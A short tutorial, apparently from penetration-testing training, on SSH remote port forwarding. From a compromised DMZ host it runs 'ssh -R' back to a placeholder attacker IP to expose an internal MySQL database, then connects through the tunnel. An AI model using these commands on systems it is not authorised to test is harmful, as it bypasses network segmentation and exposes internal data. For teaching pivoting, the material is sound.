Remote Port Forwarding in Action

Exposing an internal database service to your attacker machine.

Scenario Setup

  • Attacker Machine: Your local system.
  • JumpHost (DMZ): 10.0.0.5 (compromised, initiates connection).
  • InternalDB: 192.168.1.200:3306 (target).
  • Goal: Access InternalDB from AttackerMachine.
Key Takeaway

The -R flag creates a reverse tunnel, exposing a remote service on your local machine.

# 1. Establish Remote Port Forwarding from JumpHost
ssh -R 9000:192.168.1.200:3306 user@AttackerMachine_IP
This command, run on the JumpHost, connects back to your AttackerMachine and maps its port 9000 to the internal database.
# 2. Access InternalDB from Attacker Machine (new terminal)
mysql -h 127.0.0.1 -P 9000 -u <db_username> -p
Expected Output: MySQL prompt, connected to the internal database.
